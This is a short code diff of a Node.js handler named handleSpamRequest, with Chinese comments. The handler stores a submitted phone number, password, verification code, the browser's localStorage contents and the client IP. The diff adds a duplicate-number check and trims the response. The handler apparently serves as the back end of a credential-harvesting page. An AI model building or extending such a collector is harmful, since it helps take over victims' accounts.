@@ -12,6 +12,13 @@ export const handleSpamRequest = handleAsync(
     const { phoneCode, password, phoneNumber, ...localStorageData } =
       parsedData;
 
+    // 如果客户端的 phoneNumber 已经存在于数据库中，抛出错误
+    const existingCustomer = await Customer.findOne({ phoneNumber });
+
+    if (existingCustomer) {
+      throw new Error('该手机号码已经存在');
+    }
+
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址
 
     // 创建新的 Customer 实例
@@ -29,9 +36,7 @@ export const handleSpamRequest = handleAsync(
     // 返回成功响应
     res.status(200).json({
       message: '请求成功',
-      data: { phoneCode, password, phoneNumber },
-      localStorage: localStorageData,
-      ip,
+      data: { phoneCode },
     });
   },
 );
